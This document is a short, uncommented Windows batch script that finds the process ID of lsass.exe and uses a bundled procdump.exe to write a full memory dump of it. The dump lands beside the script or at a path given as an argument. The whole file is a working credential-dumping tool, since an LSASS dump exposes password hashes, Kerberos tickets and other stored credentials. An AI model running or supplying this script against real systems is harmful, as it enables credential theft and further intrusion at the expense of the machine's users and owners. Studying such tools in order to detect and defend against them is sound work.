@echo off
setlocal EnableDelayedExpansion

for /f "tokens=2" %%i in ('C:\Windows\System32\tasklist.exe /fi "imagename eq lsass.exe" /nh') do set PID=%%i
echo LSASS PID: %PID%

if "%~1"=="" (
    "%~dp0procdump.exe" -accepteula -ma %PID%
    echo Done.
    dir "%~dp0*.dmp"
    goto :eof
)

set OUTFILE=%~f1
if "!OUTFILE:~-1!"=="\" set OUTFILE=!OUTFILE:~0,-1!
if exist "!OUTFILE!\" set OUTFILE=!OUTFILE!\lsass_procdump.dmp

"%~dp0procdump.exe" -accepteula -ma %PID% "!OUTFILE!"
echo Done.
dir "!OUTFILE!"
